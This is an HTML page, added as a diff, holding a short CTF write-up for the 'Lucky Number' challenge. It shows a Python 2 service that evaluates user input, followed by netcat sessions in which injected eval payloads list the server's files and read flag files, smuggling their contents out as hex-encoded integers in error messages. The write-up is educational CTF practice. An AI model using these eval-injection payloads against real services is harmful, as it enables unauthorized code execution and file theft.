@@ -1,0 +1,161 @@
+<html>
+ <head>
+<title>pyeval2</title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+ <p style="color:white;font-size:2.2em;"> Pyeval 2 </p>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> BioTerra CTF : Lucky Number Writeup  </h1>
+   
+ <br> 
+
+<p> I learnt the Eval() vulnerability only after seeing this question and blogged about some basic exploit too.. but i was unable to get the flag , on of my senior helped me out so here it goes ..  </p>
+<br>
+<code>#!/usr/bin/env python2
+import logging as log
+import sys
+log.basicConfig(filename="lucky_number.log")
+
+FLAG_FILE = "flag.txt"
+
+def getSecret():
+    return open(FLAG_FILE).read()
+
+def prime_factor(n):
+    i = 2
+    while i * i <= n:
+        if n % i:
+            i += 1
+        else:
+            n //= i
+    return n
+
+def check_number(number):
+    """
+    Checks if a number is a good lucky number.
+    """
+    if not isinstance(number, int) or number < 1:  # condition must be false = not true 
+        return False
+
+    for i in range(3):
+        number = number << i * i
+
+    if number > 0xAAA:
+        return False
+    
+    cor = prime_factor(number >> 3) ** 3
+    
+    if cor == 8 or cor == 4412:
+        return False
+
+    number = number & 0xF0F0 >> 8
+    return number << 1 == cor
+
+
+def main():
+    sys.stdout.write("Your lucky number:")
+    sys.stdout.flush()
+    number = int(input(""))
+    if check_number(number):
+        print(getSecret())
+    else:
+        print("Sorry " + str(number) + " is not a good lucky number.")
+
+if __name__ == '__main__':
+    try:
+        main()
+    except BaseException as ex:
+        log.error(str(type(ex)) + str(ex))
+        print("Dafuq are you doing?")</code>
+<br>
+
+<p> The solution goes like this ... </p>
+
+<code> $ nc pwn.bioterra.xyz 4455
+
+Your lucky number: eval('int(open("flag.txt").read().encode("hex"),16)')
+
+ Sorry 337525767188140550088399172147333634157597015656050502929863081620339940171846970455466902578741092263765041199540418055192913726139466963575148968021390277031169335897610 is not a good lucky number.
+
+decode -> 'You came here to find a flag. I have bad news: you have to dig deeper.\n'
+
+
+$ nc pwn.bioterra.xyz 4455
+
+Your lucky number:eval('int(" ".join(__import__("glob").glob("*")).encode("hex"),16)')
+
+Sorry 1453562628065643472662079201217526249117057357179171707844479822976819718786584261355165292489996053572269641484875558843221517604363350353212944732271179892 is not a good lucky number.
+
+decode-> 'lib flag.txt main.py dev lib64 lucky_number.log usr real_flag.txt'
+
+$ nc pwn.bioterra.xyz 4455
+
+Your lucky number:eval('int(open("real_flag.txt").read().encode("hex"),16)')
+
+Sorry 42134526936706142044723527334065041550540595781765024517455445258 is not a good lucky number.
+
+decode -> FLAG</code>
+
+<p> I too first tried  to sys.stdout.write(getScret()) buy as u can see that was not original flag just a troll (: <br>
+    the trick used here first we have to encode the output in hex and then int ... </p>
+
+</body>
+</html>
